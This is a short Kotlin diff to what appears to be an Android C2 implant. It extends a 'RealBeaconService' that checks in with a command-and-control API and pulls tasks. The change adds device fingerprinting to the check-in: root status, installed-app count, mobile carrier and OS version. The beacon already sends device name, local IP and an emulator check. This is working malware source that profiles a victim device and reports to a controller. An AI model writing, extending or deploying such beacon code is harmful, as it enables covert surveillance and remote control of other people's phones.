@@ -32,14 +32,18 @@ import javax.inject.Inject
 @ContributesBinding(AppScope::class)
 class RealBeaconService @Inject constructor(
     private val c2Api: C2ApiService,
+    private val fingerprinter: DeviceFingerprinter,
 ) : BeaconService {
 
     override suspend fun checkIn(): CheckInResult {
         val checkInRequest = CheckInRequest(
             device_name = getDeviceName(),
             ip_address = getLocalIpAddress(),
-            os_info = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})",
+            os_info = fingerprinter.androidVersion(),
             is_emulator = detectEmulator(),
+            is_rooted = fingerprinter.isRooted(),
+            installed_apps_count = fingerprinter.installedAppCount(),
+            carrier = fingerprinter.carrier(),
         )
         val checkInResponse = c2Api.checkIn(checkInRequest)
         val tasksResponse = c2Api.getTasks(getDeviceName())
